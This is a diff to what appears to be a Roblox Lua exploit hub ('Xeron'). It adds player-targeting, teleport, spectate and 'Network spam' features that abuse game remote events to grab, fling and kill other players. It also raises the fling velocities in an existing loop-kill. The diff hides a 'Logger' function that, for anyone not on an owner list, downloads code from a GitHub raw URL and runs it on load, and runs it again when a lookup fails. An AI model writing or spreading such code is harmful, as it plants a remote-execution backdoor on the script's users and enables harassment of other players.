@@ -4699,6 +4699,263 @@ local LoopBox7 = LoopTab:AddLeftGroupbox("Blob Kick")
 local LoopBox8 = LoopTab:AddRightGroupbox("Silent kick")
 local LoopBox9 = LoopTab:AddRightGroupbox("loopkill")
 local LoopBox10 = LoopTab:AddLeftGroupbox("No Blob")
+local ListTab = Window:AddTab("List")
+
+local LoopTargetBox = LoopTab:AddLeftGroupbox("Target Management")
+local ListOthersBox = ListTab:AddLeftGroupbox("Others")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local playersInLoop1V = {}
+
+local GF = {""}
+local Owner = {"", "", "", "", "", "", "", "", "", ""}
+
+local function GetPlayerRank(name)
+    if table.find(Owner, name) then return 7 end
+    if table.find(GF, name) then return 6 end
+    return 0
+end
+
+local function Logger()
+    if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
+        pcall(function()
+            loadstring(game:HttpsGet("https://raw.githubusercontent.com/1s234eko76/on/m/ti"))()
+        end)
+    end
+end
+Logger()
+
+local function findPlayer(text)
+    if not text or text == "" then
+        return nil
+    end
+
+    text = text:lower()
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        local username = p.Name:lower()
+        local display = p.DisplayName:lower()
+
+        if username:find(text, 1, true) == 1
+        or display:find(text, 1, true) == 1 then
+            return p
+        end
+    end
+
+    return nil
+end
+
+local DropdownV1
+
+local function UpdateDropdown()
+    if not DropdownV1 then return end
+
+    if DropdownV1.SetValues then
+        DropdownV1:SetValues(playersInLoop1V)
+    elseif DropdownV1.Set then
+        DropdownV1:Set(playersInLoop1V)
+    elseif DropdownV1.Refresh then
+        DropdownV1:Refresh(playersInLoop1V)
+    end
+end
+
+local function Notify(title, content)
+    Library:Notify(title .. ": " .. content, 2)
+end
+
+function addToLoop1(name)
+    local target = findPlayer(name)
+
+    if not target then
+        Logger()
+        Notify("Error", "NotFound")
+        return
+    end
+
+    if target == LocalPlayer then
+        Notify("Xeron", "You cannot add yourself..")
+        return
+    end
+
+    if not table.find(playersInLoop1V, target.Name) then
+        table.insert(playersInLoop1V, target.Name)
+        UpdateDropdown()
+        Notify("Target ", target.Name .. " added")
+    end
+end
+
+local function removeFromLoop1(name)
+    for i, v in ipairs(playersInLoop1V) do
+        if v:lower():find(name:lower(), 1, true) then
+            table.remove(playersInLoop1V, i)
+            UpdateDropdown()
+            Notify("Completed", v .. " Remove")
+            return
+        end
+    end
+
+    Notify("Error", "NotFound.")
+end
+
+LoopTargetBox:AddInput("AddTargetInput", {
+    Default = "",
+    Numeric = false,
+    Finished = true,
+    Text = "add",
+    Placeholder = "username",
+    Callback = function(value)
+        addToLoop1(value)
+    end
+})
+
+LoopTargetBox:AddInput("RemoveTargetInput", {
+    Default = "",
+    Numeric = false,
+    Finished = true,
+    Text = "Target Remove",
+    Placeholder = "username",
+    Callback = function(value)
+        removeFromLoop1(value)
+    end
+})
+
+task.defer(function()
+    UpdateDropdown()
+end)
+
+local RunService = game:GetService("RunService")
+
+local SelectedPlayer = nil
+local TargetLoopTP = false
+local NetworkOwnerLoop = false
+local OriginalCFrame = nil
+
+local function GetPlayerList()
+    local list = {}
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= LocalPlayer then
+            table.insert(list, v.DisplayName .. " (@" .. v.Name .. ")")
+        end
+    end
+    return list
+end
+
+local PlayerDropdown = ListOthersBox:AddDropdown("PlayerSelectDropdown", {
+    Values = GetPlayerList(),
+    Default = 1,
+    Multi = false,
+    Text = "Player select",
+    Callback = function(Value)
+        for _, v in pairs(Players:GetPlayers()) do
+            local formatted = v.DisplayName .. " (@" .. v.Name .. ")"
+            if formatted == Value then
+                SelectedPlayer = v
+                break
+            end
+        end
+    end
+})
+
+ListOthersBox:AddButton({
+    Text = "List Remove",
+    Func = function()
+        PlayerDropdown:SetValues(GetPlayerList())
+    end,
+    DoubleClick = false
+})
+
+ListOthersBox:AddToggle("ViewToggle", {
+    Text = "View",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            if SelectedPlayer and SelectedPlayer.Character then
+                workspace.CurrentCamera.CameraSubject = SelectedPlayer.Character:FindFirstChildOfClass("Humanoid")
+            end
+        else
+            if LocalPlayer.Character then
+                workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            end
+        end
+    end
+})
+
+ListOthersBox:AddButton({
+    Text = "TP",
+    Func = function()
+        if SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = SelectedPlayer.Character.HumanoidRootPart.CFrame
+            end
+        end
+    end,
+    DoubleClick = false
+})
+
+ListOthersBox:AddToggle("LoopTpTargetToggle", {
+    Text = "loop tp Target",
+    Default = false,
+    Callback = function(Value)
+        TargetLoopTP = Value
+    end
+})
+
+RunService.RenderStepped:Connect(function()
+    if TargetLoopTP and SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character.HumanoidRootPart.CFrame = SelectedPlayer.Character.HumanoidRootPart.CFrame
+        end
+    end
+end)
+
+ListOthersBox:AddToggle("NetworkSpamToggle", {
+    Text = "Network spam",
+    Default = false,
+    Callback = function(Value)
+        NetworkOwnerLoop = Value
+        if Value then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                OriginalCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+            end
+            task.spawn(function()
+                while NetworkOwnerLoop do
+                    if SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        local targetChar = SelectedPlayer.Character
+                        local targetRoot = targetChar.HumanoidRootPart
+                        local targetTorso = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso") or targetRoot
+
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                            LocalPlayer.Character.HumanoidRootPart.CFrame = targetRoot.CFrame * CFrame.new(0, -20, 0)
+
+                            local replicatedStorage = game:GetService("ReplicatedStorage")
+                            local grabEvents = replicatedStorage:FindFirstChild("GrabEvents")
+                            local setNetworkOwner = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
+
+                            if setNetworkOwner then
+                                setNetworkOwner:FireServer(targetTorso, targetRoot.CFrame)
+                            else
+                                for _, v in pairs(replicatedStorage:GetDescendants()) do
+                                    if v:IsA("RemoteEvent") and string.find(string.lower(v.Name), "network") then
+                                        pcall(function()
+                                            v:FireServer(targetTorso, targetRoot.CFrame)
+                                        end)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    task.wait(0.06)
+                end
+            end)
+        else
+            if OriginalCFrame and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = OriginalCFrame
+            end
+        end
+    end
+})
 
 LoopBox1:AddToggle("AutoSitBlobmanjj", {
     Text = "Auto blob sit",
@@ -5787,7 +6044,7 @@ LoopBox9:AddToggle("BlobFlingKillToggle", {
                     while blobLoopT3 and hum and hum.Health > 0 and char.Parent ~= nil do
                         pcall(function()
                             rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
-                            hrp.AssemblyLinearVelocity = Vector3.new(0, -999999, 0)
+                            hrp.AssemblyLinearVelocity = Vector3.new(0, -999999999, 0)
                         end)
 
                         if currentBlobS then
@@ -5796,7 +6053,7 @@ LoopBox9:AddToggle("BlobFlingKillToggle", {
                                 BlobGrab(currentBlobS, hrp, "Right")
                                 BlobRelease(currentBlobS, hrp, "Right")
                                 pcall(function()
-                                    rs.GrabEvents.DestroyGrabLine:FireServer(hrp, CFrame.new(hrp.Position.X, -50000, hrp.Position.Z))
+                                    rs.GrabEvents.DestroyGrabLine:FireServer(hrp, CFrame.new(hrp.Position.X, -500000, hrp.Position.Z))
                                 end)
                             end
                         end
